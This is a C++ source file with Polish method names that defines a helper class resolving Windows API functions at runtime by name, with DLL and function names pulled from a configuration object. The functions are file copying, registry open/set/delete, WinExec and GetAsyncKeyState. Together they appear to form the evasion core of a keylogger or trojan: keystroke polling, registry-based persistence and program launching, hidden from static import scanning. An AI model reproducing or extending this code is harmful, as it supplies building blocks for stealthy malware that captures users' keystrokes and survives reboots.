#include "newWinApi.h"

newWinApi::newWinApi() {
    Config *config = new Config();
    //DLL files name:
    this->advapi32Library = config->StringToLPCTSTR(config->GetAdvapi32Library());
    this->kernel32Library = config->StringToLPCTSTR(config->GetKernel32Library());
    this->user32Library = config->StringToLPCTSTR(config->GetUser32Library());
    //Function DLL WinApi name:
    this->CopyFileAFunction = config->StringToLPCTSTR(config->GetCopyFileAFunction());
    this->RegOpenKeyExAFunction = config->StringToLPCTSTR(config->GetRegOpenKeyExAFunction());
    this->RegSetValueExAFunction = config->StringToLPCTSTR(config->GetRegSetValueExAFunction());
    this->RegCloseKeyFunction = config->StringToLPCTSTR(config->GetRegCloseKeyFunction());
    this->RegDeleteValueFunction = config->StringToLPCTSTR(config->GetRegDeleteValueFunction());
    this->WinExecFunction = config->StringToLPCTSTR(config->GetWinExecFunction());
    this->AsyncKeyStateFunction = config->StringToLPCTSTR(config->GetAsyncKeyStateFunction());
    //
}

__CopyFile newWinApi::KopiujPlik() {
    return (__CopyFile) GetProcAddress(GetModuleHandle(this->GetKernel32Library()), this->GetCopyFileAFunction());
}

__RegOpenKeyEx newWinApi::OtworzKluczRejestru() {
    return (__RegOpenKeyEx) GetProcAddress(GetModuleHandle(this->GetAdvapi32Library()), this->GetRegOpenKeyExAFunction());
}

__RegSetValueEx newWinApi::UstawWartoscKluczaRejestru() {
    return (__RegSetValueEx) GetProcAddress(GetModuleHandle(this->GetAdvapi32Library()), this->GetRegSetValueExAFunction());
}

__RegCloseKey newWinApi::ZamknijKluczRejestru() {
    return (__RegCloseKey) GetProcAddress(GetModuleHandle(this->GetAdvapi32Library()), this->GetRegCloseKeyFunction());
}

__RegDeleteValue newWinApi::UsunKluczRejestru() {
    return (__RegDeleteValue) GetProcAddress(GetModuleHandle(this->GetAdvapi32Library()), this->GetRegDeleteValueFunction());
}

__WinExec newWinApi::UruchomPlik() {
    return (__WinExec) GetProcAddress(GetModuleHandle(this->GetKernel32Library()), this->GetWinExecFunction());
}

__AsyncKeyState newWinApi::PobierzKlawiszAsync() {
    return (__AsyncKeyState) GetProcAddress(GetModuleHandle(this->GetUser32Library()), this->GetAsyncKeyStateFunction());
}



//=
//        =
//        =
//        =
//        //__RegQueryValueEx OdczytajWartoscKlucza = (__RegQueryValueEx) GetProcAddress(GetModuleHandle("Advapi32.dll"), "RegQueryValueExA");
//        //__CopyFile KopiujPlik = (__CopyFile) GetProcAddress(GetModuleHandle("Kernel32.dll"), "CopyFileA");
//
//        //TYPY-----------
//
//        //---------------

LPCTSTR newWinApi::GetAdvapi32Library() {
    return this->advapi32Library;
}

LPCTSTR newWinApi::GetKernel32Library() {
    return this->kernel32Library;
}

LPCTSTR newWinApi::GetUser32Library() {
    return this->user32Library;
}

LPCTSTR newWinApi::GetAsyncKeyStateFunction() {
    return this->AsyncKeyStateFunction;
}

LPCTSTR newWinApi::GetCopyFileAFunction() {
    return this->CopyFileAFunction;
}

LPCTSTR newWinApi::GetRegCloseKeyFunction() {
    return this->RegCloseKeyFunction;
}

LPCTSTR newWinApi::GetRegDeleteValueFunction() {
    return this->RegDeleteValueFunction;
}

LPCTSTR newWinApi::GetRegOpenKeyExAFunction() {
    return this->RegOpenKeyExAFunction;
}

LPCTSTR newWinApi::GetRegSetValueExAFunction() {
    return this->RegSetValueExAFunction;
}

LPCTSTR newWinApi::GetWinExecFunction() {
    return this->WinExecFunction;
}
